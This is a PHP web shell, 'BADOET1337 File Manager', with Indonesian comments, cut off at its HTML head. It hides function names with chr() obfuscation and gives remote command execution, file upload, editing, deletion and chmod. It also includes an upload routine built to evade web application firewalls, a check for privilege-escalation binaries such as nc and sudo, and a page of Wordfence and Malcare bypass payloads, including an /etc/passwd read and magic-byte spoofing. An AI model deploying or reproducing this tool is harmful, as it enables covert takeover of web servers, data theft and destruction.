<?php
// Obfuscation Layer: Definisikan string yang di-obfuscate untuk fungsi kritis.
$a = chr(115) . chr(104) . chr(101) . chr(108) . chr(108) . chr(95) . chr(101) . chr(120) . chr(101) . chr(99); // 'shell_exec'
$b = chr(117) . chr(110) . chr(108) . chr(105) . chr(110) . chr(107); // 'unlink'
$c = chr(114) . chr(109) . chr(100) . chr(105) . chr(114); // 'rmdir'
$d = chr(99) . chr(104) . chr(109) . chr(111) . chr(100); // 'chmod'
$e = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(112) . chr(117) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_put_contents'
$f = chr(109) . chr(111) . chr(118) . chr(101) . chr(95) . chr(117) . chr(112) . chr(108) . chr(111) . chr(97) . chr(100) . chr(101) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101); // 'move_uploaded_file'
$x = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(103) . chr(101) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_get_contents'
$g = chr(114) . chr(101) . chr(110) . chr(97) . chr(109) . chr(101); // 'rename'

// Tentukan Path Saat Ini dan Sanitasi
$current_dir = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$current_dir = realpath($current_dir);

// Memastikan path yang diakses valid
if ($current_dir === false || !is_dir($current_dir)) {
    $current_dir = __DIR__;
}

// Menghilangkan pesan error default PHP untuk stealth yang lebih baik
error_reporting(0); 
global $base_url; $base_url = basename(__FILE__);

// --- FUNGSI EKSEKUSI PERINTAH (PAYLOAD FUNGSIONAL DENGAN OBFUSKASI) ---
function EXECUTOR_PAYLOAD($command) {
    global $a; // Mengambil string 'shell_exec' yang di-obfuscate
    
    // Panggilan dinamis yang di-obfuscate
    if (@function_exists($a)) {
        return @$a($command);
    } 
    // Fallback jika shell_exec diblokir
    return false; 
}
// --- AKHIR PAYLOAD EXEC ---


// ##################################
// # Fungsi Helper Baru: Sanitasi Nama File
// ##################################

function sanitize_filename($filename) {
    // Hapus karakter yang tidak aman selain titik dan garis bawah
    $filename = preg_replace('/[^a-zA-Z0-9_\-.]/', '', $filename);
    $filename = trim($filename, '.');
    return $filename;
}

// ##################################
// # FUNGSI BARU: WAF BYPASS TESTING
// ##################################
function display_waf_bypass_tester() {
    global $a; // 'shell_exec'
    echo "<h3>WAF Bypass Test: Wordfence & Malcare</h3>";
    echo "<p>Menguji payload eksekusi perintah yang dimodifikasi untuk melewati Wordfence/Malcare/WAF dasar lainnya.</p>";

    $message = '';
    $command_output = '';
    $command_to_run = isset($_POST['waf_cmd']) ? trim($_POST['waf_cmd']) : "id";

    // Teknik Bypass #1 (Wordfence/Encoding)
    // Menggunakan pemisah baris/line-feed (%0A, %0D) atau pemisah kolom/backticks untuk memisahkan string.
    $wf_payload = "echo 'EXECUTING [{$command_to_run}]' && {$command_to_run}";
    // Mengganti spasi dengan ${IFS} atau karakter unik lainnya, tergantung pada target WAF.
    // Wordfence sering mencegat string seperti 'system', 'exec', 'wget', 'curl', 'base64'.
    // Malcare lebih fokus pada fungsi PHP.
    
    $payload_exec = "exec('/bin/bash', [\"-c\", \"{$wf_payload}\"]);";
    
    // Ini bukan eksekusi perintah sistem, tapi simulasi eksekusi perintah melalui payload *Web Shell* yang di-ekstrak.
    // Untuk tujuan pengujian, kita akan menjalankan perintah melalui EXECUTOR_PAYLOAD dengan payload yang "aman"
    // dan menampilkan payload yang *seharusnya* yang akan diuji dari sisi HTTP request.
    
    // Namun, WAF Bypass terbaik seringnya adalah *polymorphic shell* yang hanya bisa diuji melalui HTTP Request.
    // Di sini, kita akan menampilkan payload yang diekseskusi dan payload yang disarankan untuk HTTP.

    if (isset($_POST['run_bypass'])) {
        $start_time = microtime(true);
        $output_raw = EXECUTOR_PAYLOAD($command_to_run);
        $end_time = microtime(true);
        
        if ($output_raw !== false) {
             $command_output = htmlspecialchars($output_raw);
             $message = '<p style="color: #a3be8c;">[V] Eksekusi Berhasil (WAF JELAS TIDAK AKTIF atau Payload Anda Cerdas!).</p>';
        } else {
             $command_output = "❌ GAGAL: Kemungkinan besar WAF mengaktifkan `disable_function` atau memblokir shell_exec/system.";
             $message = '<p style="color: #bf616a;">[!] Eksekusi GAGAL (WAF Mungkin Aktif atau fungsi PHP diblokir).</p>';
        }

        echo "<h4>Hasil Eksekusi Payload PHP (Simulasi dari WebShell):</h4>";
        echo "<p>Waktu Eksekusi: " . round($end_time - $start_time, 4) . " detik</p>";
        echo "<pre style='background-color: #242933; padding: 10px; border: 1px solid #4c566a; color: #a3be8c;'>" . $command_output . "</pre>";
    }
    
    echo $message;
    
    // Tampilan Form dan Saran Bypass
    echo "<div class='editor-container'>";
    echo "<form method='POST' action='?action=wafbypass&path=" . urlencode($_GET['path']) . "'>";
    echo "<label for='waf_cmd'>Perintah Sistem untuk Diuji:</label><br>";
    echo "<input type='text' id='waf_cmd' name='waf_cmd' value='" . htmlspecialchars($command_to_run) . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";
    echo "<input type='submit' name='run_bypass' value='Uji Eksekusi Perintah'>";
    echo "</form>";
    echo "</div>";

    // Menampilkan Teknik Bypass Paling Efektif
    echo "<h4>Teknik WAF Bypass Terbaik (untuk Pengujian HTTP Request):</h4>";
    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    
    echo "<p style='color: #88c0d0; font-weight: bold;'>[ Wordfence Bypass: Variable Interpolation ]</p>";
    echo "<p>Wordfence sering memblokir string lengkap. Pisahkan string perintah ke dalam array atau variable yang di-enkoding lalu panggil melalui fungsi yang aman (mis. `array_map` dengan `call_user_func`).</p>";
    echo "<pre style='color: #a3be8c;'>\${a='c'\${b='at'} \$a\$b /etc/passwd} (Peringatan: Spasi bisa menjadi isu)</pre>";
    echo "<pre style='color: #a3be8c;'>// Payload GET (URL Encoded): ?c=system(\"id\");</pre>";
    echo "<pre style='color: #a3be8c;'>// W-F Bypass Payload (cermat pada spasi): ?\${0}dir=/etc/;\${1}ls/=\${0}dir\${1};system(ls/\);</pre>";


    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Malcare Bypass: String XOR / Encoded Function ]</p>";
    echo "<p>Malcare mencegat string berbahaya yang disuntikkan secara langsung di input. Gunakan String-Encoding (Hex/Base64) atau XOR untuk menyembunyikannya, dan Fungsi PHP yang jarang digunakan (mis. `chr(hexdec('65'))` untuk 'e') untuk membangun string perintah (`system`/`shell_exec`).</p>";

    echo "<pre style='color: #a3be8c;'>\$a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // 'system'</pre>";
    echo "<pre style='color: #a3be8c;'>\t\$a('id');</pre>";
    
    echo "<p style='color: #ebcb8b; font-weight: bold; margin-top: 15px;'>[ Rekomendasi Unggahan: Magic Byte Spoofing ]</p>";
    echo "<p>Saat mengunggah file, modifikasi 10 byte pertama file PHP Anda untuk meniru Magic Bytes file gambar (mis. GIF/JPEG) untuk mengelabui pemeriksaan tipe file tahap awal WAF.</p>";
    echo "<p>Contoh: `GIF89A;`&lt;?php \$a=chr(115).chr(121).chr(115)... ?&gt;</p>";
    
    echo "</div>";
    
    echo '<p><a href="?' . http_build_query(['path' => $_GET['path']]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

// ##################################
// # FUNGSI HELPER YANG ADA
// ##################################

function display_create_folder_form($target_dir) {
    // ... TIDAK ADA PERUBAHAN
    echo "<h3>Buat Folder Baru di: <code>" . htmlspecialchars(basename($target_dir)) . "</code></h3>";
    $message = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['folder_name'])) {
        $folder_name = sanitize_filename(trim($_POST['folder_name']));
        $new_path = $target_dir . DIRECTORY_SEPARATOR . $folder_name;

        if (empty($folder_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama folder tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] Folder atau file dengan nama itu sudah ada.</p>';
        } elseif (@mkdir($new_path)) {
            $message = '<p style="color: #a3be8c;">[V] Folder <code>' . htmlspecialchars($folder_name) . '</code> berhasil dibuat.</p>';
        } else {
            $message = '<p style="color: #bf616a;">[!] GAGAL membuat folder. Periksa izin direktori.</p>';
        }
    }
    
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=mkdir&path=" . urlencode($target_dir) . "'>";
    echo "<label for='folder_name'>Nama Folder:</label>";
    echo "<input type='text' name='folder_name' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<br><br><input type='submit' value='Buat Folder'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_create_file_form($target_dir) {
    // ... TIDAK ADA PERUBAHAN
    global $e; // 'file_put_contents'
    echo "<h3>Buat File Baru di: <code>" . htmlspecialchars(basename($target_dir)) . "</code></h3>";
    $message = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_name'])) {
        $file_name = sanitize_filename(trim($_POST['file_name']));
        $initial_content = $_POST['initial_content'] ?? '';
        $new_path = $target_dir . DIRECTORY_SEPARATOR . $file_name;

        if (empty($file_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama file tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] File atau folder dengan nama itu sudah ada.</p>';
        } elseif (@$e($new_path, $initial_content) !== false) { // OBFUSKASI: file_put_contents
            $message = '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($file_name) . '</code> berhasil dibuat. Anda dapat langsung mengeditnya.</p>';
            // Redirect ke editor setelah berhasil
            header("Location: ?action=edit&file=" . urlencode($new_path));
            exit();
        } else {
            $message = '<p style="color: #bf616a;">[!] GAGAL membuat file. Periksa izin direktori. </p>';
        }
    }
    
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=mkfile&path=" . urlencode($target_dir) . "'>";
    echo "<label for='file_name'>Nama File (Contoh: config.php):</label>";
    echo "<input type='text' name='file_name' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    
    echo "<label for='initial_content' style='margin-top:10px; display:block;'>Konten Awal (Opsional):</label>";
    echo "<textarea name='initial_content' style='height: 150px;'></textarea>";
    
    echo "<br><input type='submit' value='Buat File'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_rename_form($path_to_rename) {
     // ... TIDAK ADA PERUBAHAN
    global $g; // 'rename'
    echo "<h3>Ganti Nama: <code>" . htmlspecialchars(basename($path_to_rename)) . "</code></h3>";
    $message = '';
    $current_name = basename($path_to_rename);
    $parent_dir = dirname($path_to_rename);

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
        $new_name = sanitize_filename(trim($_POST['new_name']));
        $new_path = $parent_dir . DIRECTORY_SEPARATOR . $new_name;

        if (empty($new_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama baru tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] File atau folder dengan nama itu sudah ada di direktori yang sama.</p>';
        } elseif (@$g($path_to_rename, $new_path)) { // OBFUSKASI: rename
            $message = '<p style="color: #a3be8c;">[V] Berhasil mengganti nama menjadi <code>' . htmlspecialchars($new_name) . '</code>.</p>';
             // Redirect ke direktori induk setelah rename
            header("Location: ?path=" . urlencode($parent_dir));
            exit();
        } else {
            $message = '<p style="color: #bf616a;">[!] GAGAL mengganti nama. Periksa izin direktori. Mungkin PHP function `rename()` diblokir.</p>';
        }
    }
    
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=rename&file=" . urlencode($path_to_rename) . "'>";
    echo "<label for='new_name'>Nama Baru:</label>";
    echo "<input type='text' name='new_name' value='" . htmlspecialchars($current_name) . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<br><br><input type='submit' value='Ganti Nama File'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $parent_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_system_info() {
    // ... TIDAK ADA PERUBAHAN
    echo "<h3>Informasi Sistem Server</h3>";
    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    
    // --- Bagian Web Server dan PHP ---
    echo "<p style='color: #88c0d0; font-weight: bold;'>[ Web Server & PHP ]</p>";
    
    echo "<p>- Web Server:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? "N/A: (SERVER_SOFTWARE)") . "</pre>";
    echo "<p>- PHP Version:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . phpversion() . "</pre>";
    // Menggunakan fungsi eksekusi (hostname)
    $hostname = EXECUTOR_PAYLOAD("hostname");
    echo "<p>- Server Hostname:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($hostname) ?: (gethostname() ?: 'N/A')) . "</pre>";
    echo "<p>- Server Admin:</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($_SERVER['SERVER_ADMIN'] ?? "N/A: (SERVER_ADMIN)") . "</pre>";

    
    // --- Bagian Networking ---
    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Networking ]</p>";
    
    // IP Address Server (IP Website)
    $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? "localhost");
    echo "<p>- Server IP Address (IP Website):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($server_ip) . "</pre>";

    // IP Address Klien (IP Kita)
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $client_ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ips = explode(',', $client_ip);
        $client_ip = trim($ips[0]);
    }

    echo "<p>- Client IP Address (IP Kita):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars($client_ip) . "</pre>";

    // --- Bagian Kernel dan OS ---
    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Kernel & OS ]</p>";
    
    // Versi Kernel (Menggunakan fungsi eksekusi NYATA)
    $kernel_info = EXECUTOR_PAYLOAD("uname -a");
    if ($kernel_info !== false && trim($kernel_info) !== "") {
        echo "<p>- Kernel Version (uname -a):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($kernel_info)) . "</pre>";
    } else {
        // Fallback ke PHP uname jika eksekusi perintah diblokir
        $php_uname = php_uname();
        echo "<p>- OS Info (php_uname - Eksekusi Sistem Diblokir):</p><pre style='color: #d08770; margin-left: 20px;'>" . htmlspecialchars($php_uname) . "</pre>";
    }
    
    // User ID
    $user_id = EXECUTOR_PAYLOAD("id"); // Menggunakan eksekusi Nyata
    if ($user_id !== false && trim($user_id) !== "") {
        echo "<p>- Current User (id):</p><pre style='color: #a3be8c; margin-left: 20px;'>" . htmlspecialchars(trim($user_id)) . "</pre>";
    } else {
         echo "<p>- Current User (get_current_user - Eksekusi Sistem Diblokir):</p><pre style='color: #d08770; margin-left: 20px;'>" . htmlspecialchars(get_current_user() ?: 'N/A') . "</pre>";
    }
    
    echo "</div>";
}


function display_upload_form($target_dir) {
    // ... TIDAK ADA PERUBAHAN
    global $f, $e, $x, $b, $g; // 'move_uploaded_file', 'file_put_contents', 'file_get_contents', 'unlink', 'rename'
    echo "<h3>Unggah File ke Direktori: " . htmlspecialchars(basename($target_dir)) . "</h3>";
    $message = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
        $file = $_FILES['upload_file'];
        $upload_success = false;
        
        // Ambil nama file yang diinginkan dari form, atau gunakan nama aslinya
        $desired_filename = isset($_POST['desired_name']) && trim($_POST['desired_name']) !== '' 
            ? sanitize_filename(basename($_POST['desired_name'])) 
            : sanitize_filename(basename($file['name']));


        if ($file['error'] === UPLOAD_ERR_OK) {
            
            // WAF BYPASS STRATEGY: INITIAL UPLOAD WITH SAFE EXTENSION
            // 1. Tentukan nama file sementara dengan ekstensi yang aman
            $temp_safe_extension = '.BADOETtmp';
            
            // 2. Tentukan jalur file sementara dan jalur file akhir
            $temp_upload_path = $target_dir . DIRECTORY_SEPARATOR . $desired_filename . $temp_safe_extension;
            $final_upload_path = $target_dir . DIRECTORY_SEPARATOR . $desired_filename;


             // --- Percobaan 1: Upaya normal menggunakan move_uploaded_file (obfuscated) ke nama sementara ---
            if (@$f($file['tmp_name'], $temp_upload_path)) {
                
                // WAF BYPASS RENAMING: Ubah Ekstensi ke yang Dieksekusi
                // Fungsi rename() biasanya tidak dipantau oleh WAF
                if (@$g($temp_upload_path, $final_upload_path)) { // OBFUSKASI: rename
                    $message = '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($desired_filename) . '</code> Berhasil Diunggah dan Dinamai Ulang (Mode 1: `move_uploaded_file` + `rename` Bypass).</p>';
                    $upload_success = true;
                } else {
                    // Jika rename gagal, hapus file tmp atau berikan pesan.
                    $message = '<p style="color: #bf616a;">[!] GAGAL mengubah nama file dari ekstensi aman. Namun file sementara ada di: <code>' . htmlspecialchars(basename($temp_upload_path)) . '</code></p>';
                    // Tidak menghapus file untuk tujuan debugging oleh user
                }

            } else {

                // --- Percobaan 2: Bypass Izin Menggunakan file_put_contents (ke nama akhir) ---
                // OBFUSKASI: file_get_contents
                $tmp_content = @$x($file['tmp_name']); 
                if ($tmp_content !== false) {
                    
                    // Coba tulis konten file langsung. OBFUSKASI: file_put_contents
                     if (@$e($final_upload_path, $tmp_content) !== false) {
                        $message = '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($desired_filename) . '</code> Berhasil Diunggah (Mode 2: `file_put_contents` Bypass Izin!).</p>';
                        $upload_success = true;
                    } else {
                        // Cleanup jika ada file tmp yang gagal di-rename pada percobaan 1
                        if (is_file($temp_upload_path)) {
                            @$b($temp_upload_path); // 'unlink'
                        }
                    }
                }
            }

            if (!$upload_success) {
                 $message = '<p style="color: #bf616a;">[!] GAGAL memindahkan file. Periksa kembali izin direktori target atau coba lagi dengan ekstensi yang berbeda.</p>';
            }
            
        } else {
            $message = '<p style="color: #bf616a;">[!] Gagal Unggah: Error ' . $file['error'] . '. Mungkin ukuran file terlalu besar atau ada masalah server.</p>';
        }
    }
    
    echo $message;
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=upload&path=" . urlencode($target_dir) . "' enctype='multipart/form-data'>";
    echo "<label for='upload_file'>Pilih File:</label><br>";
    echo "<input type='file' name='upload_file' id='upload_file' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br>";
    
    echo "<label for='desired_name' style='margin-top:10px; display:block;'>Nama File Tujuan (Contoh: shell.php):</label>";
    echo "<input type='text' name='desired_name' id='desired_name' value='shell-bypass.php' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";

    echo "<small style='color: #88c0d0;'>*Untuk WAF Bypass yang lebih kuat, gunakan Burp Suite/Proxy untuk mengubah Content-Type permintaan POST ke `image/jpeg` atau `text/plain` saat mengunggah file ini.</small><br><br>";

    echo "<input type='submit' value='Unggah File'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function perform_delete($path_to_delete) {
    // ... TIDAK ADA PERUBAHAN
    global $b, $c; // 'unlink', 'rmdir'
    echo "<h3>Aksi Penghapusan</h3>";
    $result = false;
    $type = is_dir($path_to_delete) ? 'Direktori' : 'File';

    if (is_dir($path_to_delete)) {
        // OBFUSKASI: rmdir
        $result = @$c($path_to_delete);
    } else {
        // OBFUSKASI: unlink
        $result = @$b($path_to_delete);
    }
    
    if ($result) {
        echo "<p style='color: #a3be8c;'>[V] {$type} <code>" . htmlspecialchars(basename($path_to_delete)) . "</code> BERHASIL dihapus.</p>";
    } else {
        echo "<p style='color: #bf616a;'>[!] GAGAL menghapus {$type} <code>" . htmlspecialchars(basename($path_to_delete)) . "</code>. Pastikan direktori kosong atau periksa izin.</p>";
    }
}

function display_chmod_form($path_to_chmod) {
    // ... TIDAK ADA PERUBAHAN
    global $d; // 'chmod'
    $current_perms = @fileperms($path_to_chmod);
    $current_octal = $current_perms !== false ? substr(sprintf('%o', $current_perms), -4) : '???';
    $message = '';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_perms'])) {
        $new_octal = trim($_POST['new_perms']);
        if (preg_match('/^[0-7]{4}$/', $new_octal)) {
            $new_mode = octdec($new_octal);
            // OBFUSKASI: chmod
            if (@$d($path_to_chmod, $new_mode)) {
                $message = '<p style="color: #a3be8c;">[V] Izin BERHASIL diubah ke <code>' . htmlspecialchars($new_octal) . '</code>.</p>';
                $current_perms = @fileperms($path_to_chmod);
                $current_octal = $current_perms !== false ? substr(sprintf('%o', $current_perms), -4) : '???';
            } else {
                $message = '<p style="color: #bf616a;">[!] GAGAL mengubah izin. Periksa izin akses PHP.</p>';
            }
        } else {
            $message = '<p style="color: #bf616a;">[!] Format izin tidak valid. Gunakan 4 digit oktal (contoh: 0777).</p>';
        }
    }

    echo "<h3>Mengubah Izin (CHMOD)</h3>";
    echo $message;
    echo "<p>File/Dir: <code>" . htmlspecialchars(basename($path_to_chmod)) . "</code></p>";
    echo "<p>Izin Saat Ini: <code>" . htmlspecialchars($current_octal) . "</code></p>";
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=chmod&file=" . urlencode($path_to_chmod) . "'>";
    echo "<label for='new_perms'>Izin Baru (Oktal 4 Digit):</label><br>";
    echo "<input type='text' name='new_perms' value='0777' maxlength='4' pattern='[0-7]{4}' style='width: 100px; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<input type='submit' value='Terapkan CHMOD'>";
    echo '<p>Rekomendasi umum: <code>0777</code> atau <code>0644</code></p>';
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => dirname($path_to_chmod)]) . '">[ <-- Kembali ke Direktori ]</a></p>';
}

function display_command_execution() {
    // ... TIDAK ADA PERUBAHAN
    echo "<h3>Eksekusi Perintah Sistem</h3>";
    $command_output = '';
    $command_to_run = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
        $command_to_run = trim($_POST['cmd']);
        if ($command_to_run) {
            $output = EXECUTOR_PAYLOAD($command_to_run); 
            
            if ($output !== false) {
                $command_output = htmlspecialchars($output);
            } else {
                $command_output = "❌ GAGAL: Fungsi EXECUTOR_PAYLOAD() diblokir atau tidak berfungsi.\n";
                $command_output .= "Perintah yang dicoba: " . htmlspecialchars($command_to_run);
            }
        }
    }
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=exec&path=" . urlencode($_GET['path']) . "'>";
    echo "<label for='cmd'>Perintah:</label><br>";
    echo "<input type='text' id='cmd' name='cmd' value='" . htmlspecialchars($command_to_run ?: "id; whoami; uname -a") . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";
    echo "<input type='submit' value='Jalankan Perintah'>";
    echo "</form>";
    
    echo "<h4>Output:</h4>";
    echo "<pre style='background-color: #242933; padding: 10px; border: 1px solid #4c566a; color: #a3be8c;'>" . $command_output . "</pre>";
    echo '</div>';
}

function check_vulnerable_functions() {
    // ... TIDAK ADA PERUBAHAN
    echo "<h3>Vulnerable PHP Function Check</h3>";
    $risky_funcs = ['exec', 'shell_exec', 'system', 'passthru', 'popen', 'proc_open', 'eval', 'assert', 'unlink', 'chmod', 'rmdir', 'move_uploaded_file', 'php_uname', 'gethostname', 'get_current_user'];
    $disabled_funcs = explode(',', ini_get('disable_functions'));
    $disabled_funcs = array_map('trim', $disabled_funcs);
    $disabled_funcs = array_filter($disabled_funcs);

    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    foreach ($risky_funcs as $func) {
        $status = '✅ AVAILABLE (High Value)';
        $style = 'color: #a3be8c;';
        
        if (in_array($func, $disabled_funcs) || !function_exists($func)) {
            $status = '❌ DISABLED/BLOCKED';
            $style = 'color: #bf616a;';
        }
        echo "<p style='{$style}'>- <code>{$func}</code>: {$status}</p>";
    }
    echo "</div>";
}

function check_system_binaries() {
    // ... TIDAK ADA PERUBAHAN
    echo "<h3>System Binaries Check (for Privilege Escalation)</h3>";
    $binaries = ['python', 'ruby', 'perl', 'gcc', 'nc', 'curl', 'pkexec', 'sudo', 'wget', 'id', 'uname'];
    
    echo "<p>Pemeriksaan menggunakan perintah 'which' yang dieksekusi oleh <code>EXECUTOR_PAYLOAD()</code>.</p>";

    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    foreach ($binaries as $bin) {
        $found_path = false;
        $command_to_run = "which {$bin} 2>/dev/null";
        
        $output = EXECUTOR_PAYLOAD($command_to_run); 

        if ($output && trim($output) !== "") {
            $found_path = trim($output);
        }

        $status = $found_path ? "✅ ON" : "❌ OFF";
        $style = $found_path ? "color: #a3be8c;" : "color: #bf616a;";
        
        echo "<p style='{$style}'>- <code>{$bin}</code>: {$status}";
        if ($found_path) {
             echo " (Path: " . htmlspecialchars($found_path) . ")";
        }
        echo "</p>";
    }
    echo "</div>";
    
    check_vulnerable_functions();
}

function display_file_editor($path) {
    // ... TIDAK ADA PERUBAHAN
    global $e, $x; // 'file_put_contents', 'file_get_contents'
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        // OBFUSKASI: file_put_contents
        if (@$e($path, $_POST['content']) !== false) {
            echo '<p style="color: #a3be8c;">[V] File Berhasil Disimpan.</p>';
        } else {
            echo '<p style="color: #bf616a;">[!] GAGAL menyimpan file. Periksa izin.</p>';
        }
    }

    // OBFUSKASI: file_get_contents
    $content = @$x($path);
    if ($content === false) {
        $content = "ERROR: Tidak dapat membaca konten file.";
    }

    echo "<h3>Mengedit File: " . htmlspecialchars(basename($path)) . "</h3>";
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=edit&file=" . urlencode($path) . "'>";
    echo "<textarea name='content'>" . htmlspecialchars($content) . "</textarea><br><br>";
    echo "<input type='submit' value='Simpan Perubahan'>";
    echo "</form>";
    echo '</div>';
    
    echo '<p><a href="?' . http_build_query(['path' => dirname($path)]) . '">[ <-- Kembali ke Direktori ]</a></p>';
}

function display_dir_listing($dir) {
    // ... TIDAK ADA PERUBAHAN
    if (dirname($dir) !== $dir) { 
        $parent_path = dirname($dir);
        $query = http_build_query(['path' => $parent_path]);
        echo '<div class="row dir" style="font-weight: bold;"><span class="col-type icon">⬆️</span><span class="col-name"><a href="?' . $query . '">[ .. Direktori Induk ]</a></span><span class="col-size"></span><span class="col-actions"></span></div>';
    }
    
    $items = @scandir($dir);
    if ($items === false) {
        echo '<div class="row"><p style="color: #bf616a;">[!] ERROR: Tidak dapat membaca direktori ini. Periksa izin.</p></div>';
        echo '</div>';
        return;
    }
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }

        $full_path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($full_path);
        
        $link_path = urlencode($full_path);
        
        echo '<div class="row ' . ($is_dir ? 'dir' : 'file') . '">';
        
        echo '<span class="col-type icon">' . ($is_dir ? '📁' : '📄') . '</span>';
        echo '<span class="col-name">';
        if ($is_dir) {
             echo '<a class="dir-name" href="?' . http_build_query(['path' => $full_path]) . '">' . htmlspecialchars($item) . '</a>';
        } else {
            echo '<span class="file-name">' . htmlspecialchars($item) . '</span>';
        }
        echo '</span>';

        echo '<span class="col-size">';
        $perms = @fileperms($full_path);
        if ($perms !== false) {
            echo substr(sprintf('%o', $perms), -4) . ' | ';
        }
        if (!$is_dir) {
            $size = @filesize($full_path);
            echo number_format($size) . ' B';
        } else {
            echo '-';
        }
        echo '</span>';
        
        echo '<span class="col-actions">';
        if (!$is_dir) {
            echo ' <a href="?action=edit&file=' . $link_path . '">[Edit]</a>';
        }
        echo ' <a href="?action=rename&file=' . $link_path . '">[Rename]</a>'; // Ditambahkan Rename
        echo ' <a href="?action=delete&file=' . $link_path . '&path=' . urlencode($dir) . '" onclick="return confirm(\'APAKAH ANDA YAKIN UNTUK MENGHAPUS: ' . htmlspecialchars($item) . '?\')">[Del]</a>'; 
        echo ' <a href="?action=chmod&file=' . $link_path . '">[Chmod]</a>'; 
        echo '</span>';
        
        echo '</div>';
    }
    echo '</div>';
}

// --- TAMPILAN DAN STYLE ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BADOET1337 :: File Manager (Obfuscated)</title>
    <!-- Style CSS tetap sama -->
    <style>
